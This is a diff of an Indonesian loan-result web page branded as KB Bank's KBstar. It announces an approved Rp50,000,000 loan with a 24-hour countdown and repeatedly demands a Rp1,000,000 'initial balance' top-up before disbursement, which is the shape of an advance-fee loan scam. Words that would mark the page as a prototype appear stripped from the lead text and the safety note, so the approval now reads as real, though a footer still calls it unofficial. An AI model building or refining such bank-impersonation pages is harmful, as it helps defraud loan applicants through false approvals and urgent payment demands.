@@ -1,49 +1,334 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>KB BANK FIANCE — Hasil Pengajuan</title>
-  <link rel="stylesheet" href="style.css">
-  <link rel="stylesheet" href="flow.css">
-  <link rel="stylesheet" href="mobile-polish.css?v=20260807-stage1">
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <meta name="color-scheme" content="dark" />
+  <meta name="theme-color" content="#16082f" />
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' data:; style-src 'unsafe-inline'; script-src 'self' 'unsafe-inline'; connect-src 'self'; form-action 'self'; base-uri 'none';" />
+  <title>Hasil Pengajuan</title>
+  <style>
+    :root{
+      --bg1:#200c43;--bg2:#14072d;--bg3:#090417;
+      --gold:#f6cd54;--gold2:#fff19a;--text:#fff;--muted:#cfc6d9;--muted2:#a99fb5;
+      --ok:#caffc8;--line:rgba(247,205,84,.34);--surface:linear-gradient(180deg,rgba(60,28,101,.70),rgba(17,7,39,.84));
+      --radius:26px;--page:760px;
+    }
+    *{box-sizing:border-box}
+    html,body{max-width:100%;overflow-x:hidden}
+    body{margin:0;min-height:100svh;color:var(--text);font-family:Inter,ui-sans-serif,-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif;background:radial-gradient(circle at 50% -10%,rgba(91,42,153,.34),transparent 35%),linear-gradient(180deg,#090310,#120625)}
+    button{font:inherit;color:inherit;cursor:pointer}
+    .badge{position:fixed;z-index:80;top:max(10px,env(safe-area-inset-top));left:50%;transform:translateX(-50%);max-width:calc(100vw - 22px);padding:7px 11px;border-radius:999px;background:#f8db6a;color:#2b1b00;border:1px solid rgba(255,255,255,.35);font-size:10px;font-weight:900;letter-spacing:.055em;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;box-shadow:0 7px 18px rgba(0,0,0,.26)}
+    .app{width:min(100%,var(--page));min-height:100svh;margin:auto;position:relative;overflow:hidden;isolation:isolate;background:radial-gradient(circle at 98% 30%,rgba(255,185,36,.08),transparent 20%),radial-gradient(circle at 3% 2%,rgba(108,55,172,.18),transparent 23%),linear-gradient(180deg,var(--bg1),var(--bg2) 30%,var(--bg3));box-shadow:0 26px 70px rgba(0,0,0,.4)}
+    .app:after{content:"";position:absolute;width:420px;height:420px;right:-315px;bottom:120px;border-radius:50%;border:70px solid rgba(219,157,38,.34);z-index:-2}
+    .top{display:flex;justify-content:space-between;align-items:flex-end;padding:28px 28px 0;gap:18px}
+    .brand{line-height:1}.brand .name{font-size:30px;letter-spacing:-.055em}.brand .kb{background:linear-gradient(#ffc32d,#ee980b);-webkit-background-clip:text;background-clip:text;color:transparent}.brand .star{color:#f0eef5}.brand small{display:block;margin-top:7px;color:#bcb3ca;font-size:11px;letter-spacing:.04em}
+    .page-mark{font-size:11px;color:#fff18d;text-align:right;line-height:1.45}.page-mark strong{display:block;font-size:12px}
+    .content{padding:46px 28px 54px}
+    .eyebrow{margin:0 0 8px;color:#fff18d;font-size:11px;font-weight:800;letter-spacing:.16em;text-transform:uppercase}
+    h1{margin:0;font-family:Georgia,"Times New Roman",serif;font-size:39px;font-weight:400;line-height:1.07;letter-spacing:-.03em}
+    .lead{margin:12px 0 0;color:#bfb6ca;font-size:12px;line-height:1.65;max-width:580px}
+    .stack{display:grid;gap:18px;margin-top:24px}
+    .card{position:relative;padding:22px;border-radius:var(--radius);border:1px solid var(--line);background:var(--surface);box-shadow:inset 0 1px 0 rgba(255,255,255,.05),0 18px 45px rgba(0,0,0,.24);backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px)}
+    .status-card{overflow:hidden;background:radial-gradient(circle at 90% 10%,rgba(202,255,200,.09),transparent 27%),linear-gradient(145deg,rgba(73,34,119,.87),rgba(18,7,41,.92))}
+    .status-row{display:flex;justify-content:space-between;align-items:flex-start;gap:14px}
+    .status-row h2,.transaction-card h2{margin:0;font-size:16px}.sub{margin:6px 0 0;color:#b9afc4;font-size:11px;line-height:1.5}
+    .status-pill{display:inline-flex;align-items:center;gap:6px;padding:6px 9px;border-radius:999px;background:rgba(144,255,139,.09);border:1px solid rgba(165,255,161,.20);color:var(--ok);font-size:9px;font-weight:900;white-space:nowrap}.status-pill:before{content:"✓"}
+    .summary-grid{display:grid;grid-template-columns:1.15fr .85fr;gap:12px;margin-top:18px}
+    .summary-box{padding:16px;border-radius:18px;border:1px solid rgba(255,255,255,.09);background:rgba(8,4,20,.32)}
+    .summary-box span{display:block;color:#a99fb5;font-size:10px;text-transform:uppercase;letter-spacing:.065em}.summary-box strong{display:block;margin-top:7px;color:#fff;font-size:16px;line-height:1.35;overflow-wrap:anywhere}
+    .summary-box.limit strong{font-size:30px;letter-spacing:-.035em;color:#fff4b1}
+    .safety-note{margin-top:14px;padding:12px 13px;border-radius:14px;border-left:2px solid var(--gold);background:rgba(246,205,84,.055);color:#cbc2d4;font-size:10.5px;line-height:1.55}
+    .temporary-limit{margin-top:14px;padding:15px;border-radius:17px;border:1px solid rgba(246,205,84,.26);background:linear-gradient(135deg,rgba(246,205,84,.075),rgba(68,31,111,.15));box-shadow:inset 0 1px 0 rgba(255,255,255,.035)}
+    .temporary-limit-head{display:flex;justify-content:space-between;align-items:flex-start;gap:12px}
+    .temporary-limit h3{margin:0;font-size:13px;color:#fff4b1}.temporary-limit p{margin:6px 0 0;color:#cfc6d9;font-size:10.5px;line-height:1.55}
+    .time-badge{display:inline-flex;align-items:center;gap:6px;padding:6px 9px;border-radius:999px;border:1px solid rgba(246,205,84,.32);background:rgba(246,205,84,.07);color:#ffe27d;font-size:8.5px;font-weight:900;white-space:nowrap}
+    .countdown{margin-top:12px;padding:11px 12px;border-radius:13px;background:rgba(8,4,20,.30);border:1px solid rgba(255,255,255,.08);display:flex;justify-content:space-between;align-items:center;gap:12px}
+    .countdown span{color:#a99fb5;font-size:9px;text-transform:uppercase;letter-spacing:.06em}.countdown strong{font-size:15px;color:#fff19a;letter-spacing:.04em;font-variant-numeric:tabular-nums}
+    .prototype-payment-note{display:inline-flex;margin-top:12px;padding:6px 9px;border-radius:999px;border:1px solid rgba(202,255,200,.18);background:rgba(144,255,139,.06);color:#d8ffd5;font-size:8.5px;font-weight:900;letter-spacing:.04em}
+    .transaction-card{background:radial-gradient(circle at 88% 5%,rgba(246,205,84,.10),transparent 28%),var(--surface)}
+    .transaction-head{display:flex;justify-content:space-between;align-items:flex-start;gap:12px}
+    .simulation-badge{display:inline-flex;align-items:center;gap:6px;padding:6px 9px;border-radius:999px;border:1px solid rgba(246,205,84,.35);background:rgba(246,205,84,.07);color:#ffe27d;font-size:8.5px;font-weight:900;letter-spacing:.055em;text-align:center}
+    .simulation-badge:before{content:"●";font-size:8px}
+    .transaction-amount{margin:22px 0 8px;font-size:38px;font-weight:850;letter-spacing:-.045em;color:#fff;text-shadow:0 7px 24px rgba(0,0,0,.22)}
+    .transaction-copy{margin:0;color:#d6cddd;font-size:11.5px;line-height:1.65}
+    .primary{width:100%;min-height:56px;margin-top:18px;border:2px solid #f6d34f;border-radius:17px;background:linear-gradient(180deg,rgba(67,30,111,.78),rgba(25,10,55,.88));color:#ffdf63;font-size:14px;font-weight:800;box-shadow:0 0 0 2px rgba(255,199,38,.10),0 8px 24px rgba(0,0,0,.22)}
+    .primary:disabled{cursor:default;opacity:.72;border-color:rgba(202,255,200,.45);color:#d8ffd5}
+    .primary:focus-visible{outline:2px solid #fff19a;outline-offset:2px}
+    .result-message{min-height:20px;margin:10px 2px 0;color:var(--ok);font-size:10.5px;line-height:1.5}
+    footer{padding:0 28px 34px;color:#8d8299;font-size:9.5px;line-height:1.55;text-align:center}
+    @media(max-width:620px){.top{padding-left:20px;padding-right:20px}.content{padding-left:20px;padding-right:20px;padding-top:42px}.summary-grid{grid-template-columns:1fr}.status-row,.transaction-head{flex-direction:column}.summary-box.limit strong{font-size:27px}h1{font-size:34px}.card{padding:19px}.simulation-badge{white-space:normal}}
+  
+
+    /* Informasi KBstar + corporate footer — scoped, tidak memengaruhi flow utama. */
+    .kb-public-info{
+      --kbi-bg:#0c051a;--kbi-card:rgba(60,28,101,.48);--kbi-card-2:rgba(17,7,39,.72);
+      --kbi-gold:#f6cd54;--kbi-gold-soft:#fff19a;--kbi-text:#fff;--kbi-muted:#cfc6d9;
+      --kbi-border:rgba(246,205,84,.22);
+      margin:0;padding:26px 28px 30px;color:var(--kbi-text);border-top:1px solid var(--kbi-border);
+      background:linear-gradient(180deg,rgba(13,5,29,.18),rgba(9,4,23,.72));
+    }
+    .kb-public-info *{box-sizing:border-box}
+    .kb-public-alert{
+      margin:0 0 20px;padding:12px 14px;border:1px solid rgba(246,205,84,.28);border-radius:15px;
+      background:rgba(246,205,84,.07);color:#e8e0ec;font-size:11px;line-height:1.6;
+    }
+    .kb-public-alert strong{color:var(--kbi-gold-soft)}
+    .kb-public-info a{color:inherit;text-decoration:none}
+    .kb-kbstar-panel{
+      display:grid;grid-template-columns:minmax(210px,.85fr) minmax(0,1.4fr);gap:22px;align-items:center;
+      padding:18px;border:1px solid var(--kbi-border);border-radius:22px;background:var(--kbi-card-2);overflow:hidden;
+    }
+    .kb-kbstar-art{
+      min-height:210px;position:relative;overflow:hidden;border-radius:18px;padding:22px;
+      background:linear-gradient(135deg,#6518ba 0%,#8428da 60%,#e39a23 145%);
+    }
+    .kb-kbstar-art:before,.kb-kbstar-art:after{content:"";position:absolute;border-radius:50%;pointer-events:none}
+    .kb-kbstar-art:before{width:220px;height:220px;left:-110px;bottom:-135px;background:rgba(73,16,126,.42)}
+    .kb-kbstar-art:after{width:185px;height:185px;right:-90px;top:-95px;background:rgba(255,184,37,.72)}
+    .kb-kbstar-word{position:relative;z-index:2;font-size:22px;letter-spacing:-.04em}.kb-kbstar-word .kb-k{color:#ffc62d}.kb-kbstar-word .kb-s{color:#fff}
+    .kb-kbstar-tagline{position:relative;z-index:2;margin-top:25px;max-width:180px;font-size:24px;font-weight:800;line-height:1.14;letter-spacing:-.025em}
+    .kb-phone{position:absolute;z-index:3;width:65px;height:130px;border:4px solid #251c2c;border-radius:17px;background:#16111b;padding:5px;box-shadow:0 16px 28px rgba(0,0,0,.34)}
+    .kb-phone:before{content:"";display:block;height:100%;border-radius:10px;background:linear-gradient(180deg,#7b25d1,#3d126c)}
+    .kb-phone.p1{right:78px;top:62px;transform:rotate(-15deg)}.kb-phone.p2{right:24px;top:28px;transform:rotate(18deg)}
+    .kb-public-eyebrow{margin:0 0 8px;color:var(--kbi-gold);font-size:11px;font-weight:850;letter-spacing:.12em;text-transform:uppercase}
+    .kb-public-title{margin:0;font-size:25px;line-height:1.25;letter-spacing:-.025em;color:#fff}
+    .kb-public-copy{margin:10px 0 0;color:var(--kbi-muted);font-size:13px;line-height:1.7;max-width:660px}
+    .kb-public-actions{display:flex;flex-wrap:wrap;gap:10px;margin-top:17px}
+    .kb-public-action{display:inline-flex;align-items:center;justify-content:center;min-height:42px;padding:10px 14px;border-radius:13px;border:1px solid rgba(246,205,84,.25);background:rgba(246,205,84,.07);color:var(--kbi-gold-soft)!important;font-size:11.5px;font-weight:800;transition:background .18s ease,border-color .18s ease}
+    .kb-public-action:hover{background:rgba(246,205,84,.12);border-color:rgba(246,205,84,.44)}
+    .kb-corp-grid{display:grid;grid-template-columns:1fr 1.15fr 1fr;gap:18px;margin-top:18px}
+    .kb-corp-col{padding:17px;border:1px solid rgba(255,255,255,.08);border-radius:18px;background:var(--kbi-card)}
+    .kb-corp-col h3{margin:0 0 12px;color:var(--kbi-gold);font-size:13px;letter-spacing:.01em}
+    .kb-corp-col p{margin:0 0 7px;color:var(--kbi-muted);font-size:11px;line-height:1.55}
+    .kb-corp-col strong{color:#fff;font-weight:800}
+    .kb-corp-links{display:grid;gap:8px}
+    .kb-corp-links a{color:var(--kbi-muted)!important;font-size:11px;line-height:1.4}
+    .kb-corp-links a:hover{color:var(--kbi-gold-soft)!important}
+    .kb-corp-legal{margin-top:18px;padding-top:16px;border-top:1px solid rgba(246,205,84,.14);color:#aaa0b5;font-size:10px;line-height:1.65}
+    .kb-corp-legal strong{color:#ddd5e4}
+    .kb-corp-bottom{display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap;margin-top:10px;color:#8f859a;font-size:9.5px}
+    @media(max-width:760px){
+      .kb-public-info{padding:22px 20px 27px}.kb-kbstar-panel{grid-template-columns:1fr;padding:14px}.kb-kbstar-art{min-height:220px}.kb-corp-grid{grid-template-columns:1fr}.kb-public-title{font-size:22px}
+    }
+    @media(max-width:380px){
+      .kb-public-info{padding-left:16px;padding-right:16px}.kb-kbstar-art{min-height:205px;padding:18px}.kb-kbstar-tagline{font-size:21px;max-width:155px}.kb-phone{width:58px;height:116px}.kb-phone.p1{right:65px;top:70px}.kb-phone.p2{right:18px;top:36px}.kb-public-actions{display:grid}.kb-public-action{width:100%}
+    }
+    @media(prefers-reduced-motion:reduce){.kb-public-action{transition:none}}
+</style>
+  <script src="/page-transition.js?v=1"></script>
 </head>
-<body class="flow-page">
-  <main class="flow-shell">
-    <section class="flow-hero">
-      <div class="flow-top">
-        <button class="flow-back" id="backButton" type="button">←</button>
-        <button class="flow-lang" type="button">ID 🇮🇩</button>
-      </div>
-      <div class="flow-copy">
-        <div class="flow-step">Tahap 9</div>
-        <h1>Hasil Pengajuan</h1>
-        <p>Proses telah selesai dan hasil kini tersedia.</p>
+<body>
+  <div class="badge"></div>
+  <main class="app">
+    <header class="top">
+      <div class="brand"><div class="name"><span class="kb">KB</span><span class="star">star</span></div><small>by KB Bank</small></div>
+      <div class="page-mark"><strong>Hasil Pengajuan</strong></div>
+    </header>
+
+    <section class="content">
+      <p class="eyebrow">HASIL PENGAJUAN</p>
+      <h1>Hasil  Pengajuan</h1>
+      <p class="lead"> menampilkan hasil dan transaksi contoh pada antarmuka.  keputusan kredit, transfer, setoran, atau transaksi bank nyata.</p>
+
+      <div class="stack">
+        <section class="card status-card" aria-labelledby="resultStatusTitle">
+          <div class="status-row">
+            <div><h2 id="resultStatusTitle">Status</h2><p class="sub">Status Terverifikasi.</p></div>
+            <span class="status-pill"> Pengajuan Disetujui</span>
+          </div>
+          <div class="summary-grid">
+            <div class="summary-box limit"><span>Limit Tersedia</span><strong id="resultLimit">Rp50.000.000</strong></div>
+            <div class="summary-box"><span>Nama Lengkap</span><strong id="resultName">Pengguna</strong><span style="margin-top:12px">Rekening KB Bank</span><strong id="resultAccount">Belum tersedia</strong></div>
+          </div>
+          <div class="temporary-limit" aria-live="polite">
+            <div class="temporary-limit-head">
+              <div><h3>Limit Tersedia Sementara</h3><p>Limit pada tampilan ini tersedia selama <strong>24 jam</strong> untuk melanjutkan alur pengajuan </p></div>
+              <span class="time-badge">24 JAM</span>
+            </div>
+            <div class="countdown"><span>Batas waktu Pencairan</span><strong id="limitCountdown">24:00:00</strong></div>
+            <p>Selesaikan tahapan yang masih diperlukan sebelum batas waktu berakhir. Status akhir dan pencairan dana, jika ada, tetap mengikuti verifikasi, analisis kelayakan, serta ketentuan resmi bank.</p>
+            <span class="prototype-payment-note">WAJIB MELAKUKAN ISI SALDO PERDANA</span>
+          </div>
+          <p class="safety-note"><strong>Catatan:</strong> “ Pengajuan Disetujui”  persetujuan kredit dan tersedia untuk dicairkan.</p>
+        </section>
+
+        <section class="card transaction-card" aria-labelledby="firstTransactionTitle">
+          <div class="transaction-head">
+            <div><h2 id="firstTransactionTitle">Transaksi Pertama</h2><p class="sub">Konfirmasi antarmuka untuk melanjutkan .</p></div>
+            <span class="simulation-badge"></span>
+          </div>
+          <div class="transaction-amount">Rp1.000.000</div>
+          <p class="transaction-copy">Untuk melanjutkan, lakukan konfirmasi transaksi sebesar Rp1.000.000. <strong>ISI SALDO PERDANA UNTUK PENCAIRAN.</strong></p>
+          <button class="primary" id="confirmSimulation" type="button">Lanjutkan Rp1.000.000</button>
+          <div class="result-message" id="simulationMessage" role="status" aria-live="polite"></div>
+          <p class="safety-note">Segera lakukan pengisian saldo perdana sesuai ketentuan rekening untuk melanjutkan proses pencairan pinjaman yang telah Anda aktifkan.</p>
+        </section>
       </div>
     </section>
-    
-<section class="flow-card">
-  <div class="result-center">
-    <div class="result-icon">✓</div>
-    <h2 id="resultTitle">Pengajuan Berhasil Diproses</h2>
-    <p id="resultMessage">Hasil pengajuan telah tersedia.</p>
-  </div>
-  <div class="summary-list" style="margin-top:22px">
-    <div class="summary-row"><span>Nomor Pengajuan</span><strong id="applicationId">—</strong></div>
-    <div class="summary-row"><span>Status</span><strong id="status">—</strong></div>
-    <div class="summary-row"><span>Nominal Pengajuan</span><strong id="amount">—</strong></div>
-    <div class="summary-row"><span>Tenor</span><strong id="tenor">—</strong></div>
-  </div>
-  <div class="flow-note">Status pengajuan diperbarui sesuai tahapan layanan yang sedang diproses. Silakan pantau perkembangan melalui Dashboard.</div>
-  <button class="flow-button" id="dashboardButton" type="button">BUKA DASHBOARD →</button>
-</section>
+
+    <section class="kb-public-info" aria-label="Informasi KBstar dan tautan resmi KB Bank">
+      <div class="kb-public-alert" role="note">
+        <strong>Prototype independen — bukan kanal resmi KB Bank.</strong>
+        Jangan masukkan kredensial, PIN/OTP, data pribadi sensitif, atau melakukan pembayaran melalui prototype ini. Untuk layanan resmi, gunakan kanal resmi KB Bank.
+      </div>
+
+      <div class="kb-kbstar-panel">
+        <div class="kb-kbstar-art" aria-hidden="true">
+          <div class="kb-kbstar-word"><span class="kb-k">KB</span><span class="kb-s">star</span></div>
+          <div class="kb-kbstar-tagline">Warna baru spesial buat kamu</div>
+          <span class="kb-phone p1"></span>
+          <span class="kb-phone p2"></span>
+        </div>
+        <div>
+          <p class="kb-public-eyebrow">KBstar · Informasi referensi</p>
+          <h2 class="kb-public-title">Temukan informasi layanan digital KBstar melalui kanal resmi.</h2>
+          <p class="kb-public-copy">KBstar merupakan layanan digital banking KB Bank. Gunakan tombol di bawah untuk berpindah ke situs resmi KB Bank dan layanan nasabah resmi.</p>
+          <div class="kb-public-actions">
+            <a class="kb-public-action" href="https://www.kbbank.co.id/" target="_blank" rel="noopener noreferrer">Buka Situs Resmi KB Bank ↗</a>
+            <a class="kb-public-action" href="https://www.kbbank.co.id/support-center" target="_blank" rel="noopener noreferrer">Layanan Nasabah ↗</a>
+          </div>
+        </div>
+      </div>
+
+      <div class="kb-corp-grid">
+        <section class="kb-corp-col" aria-labelledby="kb-contact-title">
+          <h3 id="kb-contact-title">Hubungi Kami</h3>
+          <p><strong>Gedung KB Bank</strong></p>
+          <p>Head Office KB Bank</p>
+          <p><a href="tel:0217988266">021 7988 266</a></p>
+          <p><a href="tel:0217980625">021 7980 625</a></p>
+          <p>Jl. MT. Haryono Kav. 50–51, Jakarta 12770</p>
+        </section>
+
+        <section class="kb-corp-col" aria-labelledby="kb-about-title">
+          <h3 id="kb-about-title">Kenali Kami</h3>
+          <nav class="kb-corp-links" aria-label="Tautan perusahaan KB Bank">
+            <a href="https://www.kbbank.co.id/profile/history" target="_blank" rel="noopener noreferrer">Profil KB Bank ↗</a>
+            <a href="https://www.kbbank.co.id/csr-policy" target="_blank" rel="noopener noreferrer">Tanggung Jawab Sosial ↗</a>
+            <a href="https://www.kbbank.co.id/structure-corporate/komisaris" target="_blank" rel="noopener noreferrer">Manajemen Perusahaan ↗</a>
+            <a href="https://www.kbbank.co.id/corporate-governance/about" target="_blank" rel="noopener noreferrer">Tata Kelola Perusahaan ↗</a>
+            <a href="https://www.kbbank.co.id/investor" target="_blank" rel="noopener noreferrer">Hubungan Investor ↗</a>
+            <a href="https://www.kbbank.co.id/info-terbaru" target="_blank" rel="noopener noreferrer">Info Terbaru ↗</a>
+          </nav>
+        </section>
+
+        <section class="kb-corp-col" aria-labelledby="kb-service-title">
+          <h3 id="kb-service-title">Layanan Resmi</h3>
+          <nav class="kb-corp-links" aria-label="Tautan layanan resmi KB Bank">
+            <a href="https://www.kbbank.co.id/savings" target="_blank" rel="noopener noreferrer">Simpanan ↗</a>
+            <a href="https://www.kbbank.co.id/loan" target="_blank" rel="noopener noreferrer">Pinjaman ↗</a>
+            <a href="https://www.kbbank.co.id/credit-card" target="_blank" rel="noopener noreferrer">Kartu Kredit ↗</a>
+            <a href="https://www.kbbank.co.id/debit-card" target="_blank" rel="noopener noreferrer">Kartu Debit ↗</a>
+            <a href="https://www.kbbank.co.id/network/atm" target="_blank" rel="noopener noreferrer">ATM & Jaringan ↗</a>
+            <a href="https://www.kbbank.co.id/support-center" target="_blank" rel="noopener noreferrer">Layanan Pengaduan ↗</a>
+          </nav>
+        </section>
+      </div>
+
+      <div class="kb-corp-legal">
+        <strong>Informasi perusahaan dari kanal resmi:</strong> PT Bank KB Indonesia Tbk berizin dan diawasi oleh Otoritas Jasa Keuangan dan Bank Indonesia serta merupakan peserta penjaminan LPS. Untuk ketentuan, produk, tingkat bunga, dan informasi terbaru, verifikasi langsung melalui situs resmi KB Bank.
+      </div>
+      <div class="kb-corp-bottom">
+        <span>Referensi tautan: kbbank.co.id</span>
+        <span>Merek dan identitas KB Bank/KBstar adalah milik pemegang haknya.</span>
+      </div>
+    </section>
+
   </main>
-  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
-<script src="storage.js"></script>
-<script src="session-tracker.js?v=20260812-admin1"></script>
-  <script src="hasil-pengajuan.js"></script>
-<div style="padding:10px 16px;text-align:center;font-size:10px;line-height:1.5;color:#7c6f89;background:#f7f1fd;border-top:1px solid #eadcf8"><strong>UI Prototype</strong> — Diawasi OJK & Bank Indonesia</div>
-<script src="ui-settings.js?v=20260812-uiadmin1"></script>
+
+  <script>
+    (()=>{
+      "use strict";
+      const formatRupiah=value=>new Intl.NumberFormat("id-ID",{style:"currency",currency:"IDR",maximumFractionDigits:0}).format(value).replace(/\s/g,"");
+      
+      const storedLimit = Number(sessionStorage.getItem("kbPrototypeLimit")) || 50000000;
+const storedName = sessionStorage.getItem("kbFullName") || "";
+const storedAccount = sessionStorage.getItem("kbAccountNumber") || "";
+const resultName = document.getElementById("resultName");
+const resultAccount = document.getElementById("resultAccount");
+const resultLimit = document.getElementById("resultLimit");
+const limitCountdown = document.getElementById("limitCountdown");
+const button = document.getElementById("confirmSimulation");
+const message = document.getElementById("simulationMessage");
+
+resultName.textContent = storedName || "Pengguna";
+resultAccount.textContent = /^\d{11}$/.test(storedAccount) ? storedAccount : "Belum tersedia";
+resultLimit.textContent = formatRupiah(storedLimit);
+
+      const limitExpiryKey="kbPrototypeLimitExpiresAt";
+      let limitExpiresAt=Number(sessionStorage.getItem(limitExpiryKey));
+      if(!Number.isFinite(limitExpiresAt)||limitExpiresAt<=0){
+        limitExpiresAt=Date.now()+(24*60*60*1000);
+        sessionStorage.setItem(limitExpiryKey,String(limitExpiresAt));
+      }
+      const renderLimitCountdown=()=>{
+        const remaining=Math.max(0,limitExpiresAt-Date.now());
+        const totalSeconds=Math.floor(remaining/1000);
+        const hours=String(Math.floor(totalSeconds/3600)).padStart(2,"0");
+        const minutes=String(Math.floor((totalSeconds%3600)/60)).padStart(2,"0");
+        const seconds=String(totalSeconds%60).padStart(2,"0");
+        limitCountdown.textContent=`${hours}:${minutes}:${seconds}`;
+      };
+      let countdownTimer=0;
+      const stopCountdown=()=>{if(countdownTimer){clearInterval(countdownTimer);countdownTimer=0;}};
+      const startCountdown=()=>{
+        stopCountdown();
+        renderLimitCountdown();
+        if(Date.now()<limitExpiresAt) countdownTimer=setInterval(renderLimitCountdown,1000);
+      };
+      startCountdown();
+      document.addEventListener("visibilitychange",()=>{document.hidden?stopCountdown():startCountdown();});
+      window.addEventListener("pagehide",stopCountdown,{once:true});
+
+      const finalLogoutKey="kbFinalLogoutAt";
+      const FINAL_WINDOW_MS=5*60*1000;
+      let finalLogoutTimer=0;
+      const redirectToLogin=()=>{
+        if(finalLogoutTimer){clearTimeout(finalLogoutTimer);finalLogoutTimer=0;}
+        sessionStorage.setItem("kbReauthRequired","1");
+        sessionStorage.removeItem(finalLogoutKey);
+        const target="login.html?reauth=1";
+        window.smoothNavigate ? window.smoothNavigate(target) : (window.location.href=target);
+      };
+      const armFinalLogout=()=>{
+        if(finalLogoutTimer){clearTimeout(finalLogoutTimer);finalLogoutTimer=0;}
+        let logoutAt=Number(sessionStorage.getItem(finalLogoutKey));
+        if(!Number.isFinite(logoutAt)||logoutAt<=0){
+          logoutAt=Date.now()+FINAL_WINDOW_MS;
+          sessionStorage.setItem(finalLogoutKey,String(logoutAt));
+        }
+        const remaining=logoutAt-Date.now();
+        if(remaining<=0){redirectToLogin();return;}
+        finalLogoutTimer=setTimeout(redirectToLogin,remaining);
+      };
+
+      const renderCompleted=()=>{
+        button.disabled=false;
+        button.textContent="Kembali ke Dashboard";
+        message.textContent="Konfirmasi selesai. Halaman hasil ini dapat dibuka kembali dari Dashboard selama 5 menit.";
+        armFinalLogout();
+      };
+
+      if(sessionStorage.getItem("kbFirstSimulationConfirmed")==="1") renderCompleted();
+
+      button.addEventListener("click",()=>{
+        if(sessionStorage.getItem("kbFirstSimulationConfirmed")==="1"){
+          const target="dashboard.html";
+          window.smoothNavigate ? window.smoothNavigate(target) : (window.location.href=target);
+          return;
+        }
+        sessionStorage.setItem("kbFirstSimulationConfirmed","1");
+        sessionStorage.removeItem(finalLogoutKey);
+        renderCompleted();
+      });
+
+      document.addEventListener("visibilitychange",()=>{
+        if(!document.hidden && sessionStorage.getItem("kbFirstSimulationConfirmed")==="1") armFinalLogout();
+      });
+      window.addEventListener("pagehide",()=>{if(finalLogoutTimer)clearTimeout(finalLogoutTimer);},{once:true});
+    })();
+  </script>
+  <script src="/simulation-runtime.js?v=5" defer></script>
 </body>
 </html>
